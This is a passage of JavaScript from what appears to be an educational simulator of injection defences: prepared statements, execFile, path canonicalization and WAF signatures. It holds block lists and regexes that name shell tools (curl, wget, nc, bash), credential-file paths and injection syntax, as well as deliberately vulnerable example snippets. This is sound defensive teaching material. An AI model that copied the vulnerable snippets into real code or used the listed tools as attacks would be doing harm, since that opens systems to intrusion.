      // Detect SQL syntax elements: quotes, comment delimiters, SQL keywords
      const sqlKeywords = ['OR', 'AND', 'UNION', 'SELECT', 'DROP', 'INSERT', 'UPDATE', 'DELETE', 'WAITFOR', 'SLEEP', 'EXEC', 'BENCHMARK'];
      const regexQuote = /['";]/g;
      const regexComments = /(--|\/\*|\*\/|#)/g;

      const quotesFound = trimmed.match(regexQuote) || [];
      const commentsFound = trimmed.match(regexComments) || [];
      quotesFound.forEach(q => detectedTokens.push(q));
      commentsFound.forEach(c => detectedTokens.push(c));

      // Check keywords
      const upper = trimmed.toUpperCase();
      sqlKeywords.forEach(kw => {
        const wordRegex = new RegExp(`\\b${kw}\\b`, 'i');
        if (wordRegex.test(trimmed)) {
          detectedTokens.push(kw);
        }
      });

      if (detectedTokens.length > 0) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'Parameterized Prepared Statement (SQL Isolation)',
          status: 'BLOCKED',
          sanitizedOutput: '$1 (Input encapsulated into binary wire parameter; executed with zero syntax evaluation)',
          detectedTokens: Array.from(new Set(detectedTokens)),
          matchedRules: ['SQL Prepared Statement Variable Slot Binding ($1 / ?)', 'Type-safe parameter separation'],
          reasons: [
            `Input contained SQL metacharacters or keywords: ${detectedTokens.slice(0, 4).join(', ')}`,
            'In a parameterized prepared statement, the database engine compiles the query skeleton first. The entire string is bound as literal data, completely neutralizing injection.'
          ],
          isSafeToProcess: true,
          recommendedFix: {
            language: 'SQL / Node.js',
            vulnerableSnippet: `db.query(\`SELECT * FROM users WHERE name = '\${name}'\`);`,
            secureSnippet: `db.query('SELECT * FROM users WHERE name = $1', [name]);`,
            explanation: 'Parameters are passed separately from the query logic over the database protocol.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'Parameterized Prepared Statement (SQL Isolation)',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['Safe literal value: Bound to parameter slot $1'],
        reasons: ['No SQL control characters or delimiters detected.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'SQL',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Standard parameter binding.'
        }
      };
    }

    case 'SAFE_PROCESS_EXEC': {
      // Detect shell metacharacters: ;, |, &, `, $, (, ), <, >, \n
      const shellMetaRegex = /[;&|`$><()]/g;
      const metas = trimmed.match(shellMetaRegex) || [];
      metas.forEach(m => detectedTokens.push(m));

      const shellWords = ['cat', 'whoami', 'curl', 'wget', 'sh', 'bash', 'nc', 'ping', 'id', 'rm', 'uname'];
      shellWords.forEach(w => {
        const rx = new RegExp(`\\b${w}\\b`, 'i');
        if (rx.test(trimmed)) detectedTokens.push(w);
      });

      if (detectedTokens.length > 0) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'Safe Process Execution (execFile without /bin/sh)',
          status: 'BLOCKED',
          sanitizedOutput: `Process argv: ["${trimmed.replace(/"/g, '\\"')}"] (Received as single argument; shell chaining symbols are inert)`,
          detectedTokens: Array.from(new Set(detectedTokens)),
          matchedRules: ['Non-shell process dispatch (child_process.execFile)', 'Direct syscall execution (execve)'],
          reasons: [
            `Detected shell control characters or command names: ${detectedTokens.slice(0, 4).join(', ')}`,
            'Using execFile / ProcessBuilder bypasses the shell interpreter entirely. Punctuation like ; & | does not cause command splitting.'
          ],
          isSafeToProcess: true,
          recommendedFix: {
            language: 'Node.js',
            vulnerableSnippet: `exec(\`git log \${branch}\`); // Vulnerable`,
            secureSnippet: `execFile('git', ['log', branch]); // Secure: argv array`,
            explanation: 'Direct argv passing avoids shell command chaining and variable expansion.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'Safe Process Execution (execFile without /bin/sh)',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['No shell metacharacters detected'],
        reasons: ['Input contains no shell redirection or chaining operators.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'Node.js',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Clean parameter.'
        }
      };
    }

    case 'PATH_CANONICALIZATION': {
      // Detect dot-dot sequences, URL encoded slashes, absolute paths
      const traversalRegex = /(\.\.[\/\\]|\.\.%2f|\.\.%5c|%2e%2e|\/etc\/|windows[\/\\]win\.ini)/gi;
      const matches = trimmed.match(traversalRegex) || [];
      matches.forEach(m => detectedTokens.push(m));

      // Simulate path.basename extraction
      const parts = trimmed.split(/[\/\\]/);
      const safeBasename = parts[parts.length - 1] || 'default_file';

      if (detectedTokens.length > 0 || trimmed.includes('..')) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'Path Canonicalization & Base Directory Guard',
          status: 'BLOCKED',
          sanitizedOutput: `Safe Basename: "${safeBasename}" [Path Traversal Stripped]`,
          detectedTokens: Array.from(new Set(detectedTokens.length > 0 ? detectedTokens : ['..'])),
          matchedRules: ['path.resolve() Canonicalization check', 'path.basename() extraction guard'],
          reasons: [
            `Detected directory traversal attempt: ${detectedTokens.join(', ')}`,
            'Path canonicalization checks whether the target path resolves outside the assigned root directory and rejects or sanitizes it.'
          ],
          isSafeToProcess: false,
          recommendedFix: {
            language: 'Node.js',
            vulnerableSnippet: `fs.readFileSync(BASE_DIR + '/' + req.query.file);`,
            secureSnippet: `const safeName = path.basename(req.query.file);\nconst resolved = path.resolve(BASE_DIR, safeName);\nif (!resolved.startsWith(BASE_DIR)) throw new Error('Forbidden');`,
            explanation: 'Always verify resolved path starts with the designated safe root directory.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'Path Canonicalization & Base Directory Guard',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['Path strictly within base directory bounds'],
        reasons: ['No directory escape tokens found.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'Node.js',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Clean filename.'
        }
      };
    }

    case 'WAF_SIGNATURE_RULESET': {
      // Simulate OWASP ModSecurity Core Rule Set (CRS) inspection
      const sqliPattern = /(\b(SELECT|UNION|INSERT|DELETE|UPDATE|DROP|TABLE)\b|--|\/\*|\bOR\s+[\w']+=[\w']+)/i;
      const xssPattern = /(<\s*script|javascript:|on\w+\s*=|data:text\/html)/i;
      const cmdiPattern = /(;|\&\&|\|\||`|\$\(.*?\))/i;
      const lfiPattern = /(\.\.[\/\\]|%2e%2e|\/etc\/passwd)/i;

      if (sqliPattern.test(trimmed)) {
        matchedRules.push('OWASP CRS 942100: SQL Injection Keyword Detected');
        detectedTokens.push('SQLi signature');
      }
      if (xssPattern.test(trimmed)) {
        matchedRules.push('OWASP CRS 941100: XSS Script or Event-Handler Attribute');
        detectedTokens.push('XSS signature');
      }
      if (cmdiPattern.test(trimmed)) {
        matchedRules.push('OWASP CRS 932100: Shell Command Execution Operators');
        detectedTokens.push('Cmdi signature');
      }
      if (lfiPattern.test(trimmed)) {
        matchedRules.push('OWASP CRS 930100: Path Traversal Dot-Dot Sequences');
        detectedTokens.push('LFI signature');
      }

      if (matchedRules.length > 0) {
        return {
          input,
          defenseProfile: profile,
          profileName: 'WAF Inspection (OWASP Core Rule Set Simulator)',
          status: 'BLOCKED',
          sanitizedOutput: 'HTTP 403 Forbidden [WAF Interception: Malicious Payload Signature Matched]',
          detectedTokens,
          matchedRules,
          reasons: [
            `WAF intercepted malicious pattern: ${matchedRules.join('; ')}`,
            'Traffic dropped at reverse proxy layer before reaching application server.'
          ],
          isSafeToProcess: false,
          recommendedFix: {
            language: 'DevSecOps / WAF',
            vulnerableSnippet: `Direct public exposure with no inspection layer`,
            secureSnippet: `Cloudflare WAF / AWS WAF / ModSecurity OWASP CRS enabled`,
            explanation: 'WAF provides defense-in-depth at the perimeter, but application-level input validation and parameterization remain essential.'
          }
        };
      }

      return {
        input,
        defenseProfile: profile,
        profileName: 'WAF Inspection (OWASP Core Rule Set Simulator)',
        status: 'PASS_THROUGH',
        sanitizedOutput: trimmed,
        detectedTokens: [],
        matchedRules: ['WAF Heuristic Evaluation: No threat signatures triggered'],
        reasons: ['Request passed perimeter WAF inspection.'],
        isSafeToProcess: true,
        recommendedFix: {
          language: 'WAF',
          vulnerableSnippet: '',
          secureSnippet: '',
          explanation: 'Clear inspection.'
        }
      };
    }
  }
}
